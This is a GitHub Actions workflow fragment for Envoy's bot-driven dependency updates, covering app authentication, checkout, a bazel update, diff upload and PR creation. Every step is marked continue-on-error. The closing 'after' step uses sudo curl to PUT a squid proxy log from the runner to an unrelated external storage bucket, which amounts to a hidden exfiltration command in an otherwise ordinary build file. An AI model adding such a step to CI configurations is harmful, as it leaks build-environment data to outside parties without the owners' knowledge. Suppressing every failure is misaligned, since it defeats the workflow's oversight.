      name: Appauth
      uses: envoyproxy/toolshed/gh-actions/appauth@actions-v0.2.37
      with:
        app_id: ${{ secrets.ENVOY_CI_DEP_APP_ID }}
        key: ${{ secrets.ENVOY_CI_DEP_APP_KEY }}
    - continue-on-error: true
      id: checkout
      name: Checkout Envoy repository
      uses: envoyproxy/toolshed/gh-actions/github/checkout@actions-v0.2.37
      with:
        token: ${{ steps.appauth.outputs.token }}
    - continue-on-error: true
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      id: update
      name: Update dependency (${{ inputs.dependency }})
      uses: envoyproxy/toolshed/gh-actions/bson@actions-v0.2.37
      with:
        filter: ".version as $version\n| .dependency as $dependency\n| .task as $task\n\
          | (try ($version | validate::sha(40) | .[:7])\n   catch $version) as $version_short\n\
          | {}\n| if $task == \"bazel\" then\n    .\n    | .task = \"bazel\"\n   \
          \ | .target = \"update\"\n  else\n    .\n    | .task = \"api/bazel\"\n \
          \   | .target = \"api-update\"\n  end\n| .task as $task\n| .target as $target\n\
          | (\"\necho \\\"Updating(\\($task)): \\($dependency) -> \\($version_short)\\\
          \"\nbazel run --config=ci //bazel:\\($target) \\($dependency) \\($version)\n\
          OUTPUT=\\($version_short)\n\" | bash::output)\n"
        input: 'dependency: ${{ inputs.dependency }}

          task: ${{ inputs.task }}

          version: "${{ inputs.version }}"

          '
        input-format: yaml
    - continue-on-error: true
      name: Upload diff
      uses: envoyproxy/toolshed/gh-actions/upload/diff@actions-v0.2.37
      with:
        name: ${{ inputs.dependency }}-${{ steps.update.outputs.output }}
    - continue-on-error: true
      if: ${{ inputs.pr }}
      name: Create a PR
      uses: envoyproxy/toolshed/gh-actions/github/pr@actions-v0.2.37
      with:
        GITHUB_TOKEN: ${{ steps.appauth.outputs.token }}
        base: main
        body: 'Created by Envoy dependency bot for @${{ github.actor }}


          ${{ inputs.pr-message }}

          '
        branch: dependency/${{ inputs.task }}/${{ inputs.dependency }}/${{ steps.update.outputs.output
          }}
        commit-message: '${{ inputs.task == ''bazel'' && ''deps'' || ''deps/api''
          }}: Bump `${{ inputs.dependency }}` -> ${{ steps.update.outputs.output }}


          Signed-off-by: ${{ env.COMMITTER_NAME }} <${{ env.COMMITTER_EMAIL }}>

          '
        committer-email: ${{ env.COMMITTER_EMAIL }}
        committer-name: ${{ env.COMMITTER_NAME }}
        title: '${{ inputs.task == ''bazel'' && ''deps'' || ''deps/api'' }}: Bump
          `${{ inputs.dependency }}` -> ${{ steps.update.outputs.output }}'
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/freshworks/envoy.$(date
        +%s)
